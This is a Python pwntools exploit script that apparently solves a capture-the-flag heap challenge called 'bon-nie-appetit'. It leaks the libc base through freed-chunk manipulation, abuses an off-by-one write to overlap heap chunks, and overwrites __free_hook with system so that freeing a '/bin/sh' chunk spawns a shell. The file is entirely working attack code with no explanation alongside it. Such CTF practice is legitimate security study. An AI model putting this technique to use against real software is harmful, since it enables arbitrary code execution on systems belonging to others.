#!/usr/bin/env python3

from pwn import *

elf = ELF("./bon-nie-appetit_patched")

context.binary = elf

libc = ELF('./glibc/libc.so.6')


def create(r,size,data):
    r.sendlineafter(b'> ',b'1')
    r.sendlineafter(b'[*] For how many: ',str(size).encode())
    r.sendlineafter(b'[*] What would you like to order: ',data)
def delete(r,index):
    r.sendlineafter(b'> ',b'4')
    r.sendlineafter(b'[*] Number of order: ',str(index).encode())
def show(r,index):
    r.sendlineafter(b'> ',b'2')
    r.sendlineafter(b'[*] Number of order: ',str(index).encode())
    r.recvuntil(b' => ')
    return r.recvuntil(b'\n+=-=-=-=-=-=-=-=-=-=-=-=-=-=+\n', drop=True)    
def edit(r,index,data):
    r.sendlineafter(b'> ',b'3')
    r.sendlineafter(b'[*] Number of order: ',str(index).encode())
    r.sendlineafter(b'[*] New order: ',data)    
    
            


def main():
    r = process('./bon-nie-appetit_patched')
    gdb.attach(r)

    # STEP 1 --> leaking libc base
    
    for _ in range(9):
        create(r,0x88,b'anuj')
    
    for i in range(8,-1,-1):
        delete(r,i)    
    
    for _ in range(8):
        create(r,0x88,b'a')
    
    leak = unpack(show(r, 7)[:6].ljust(8, b'\0'),'all')
    log.info(f'Leaked main_arena address: {hex(leak)}')  
    libc.address = leak - (0x77a00b1e0a61-0x77a00ae00000)
    log.success(f'Glibc base address: {hex(libc.address)}') 
    
    #STEP-2: exploiting off-by-one byte
    
    create(r,24,b'a'*24)
    create(r,24,b'b'*24)
    create(r,24,b'c'*24)
    
    delete(r,10)
    
    edit(r,8,b'c'*24+b'\x41')
    delete(r,9)
    
    create(r,56,b'a'*24+pack(0x21)+pack(libc.sym.__free_hook))
    create(r,24,b'/bin/sh\0')
    create(r,24,pack(libc.sym.system))
    delete(r,10)

    r.interactive()
main()    



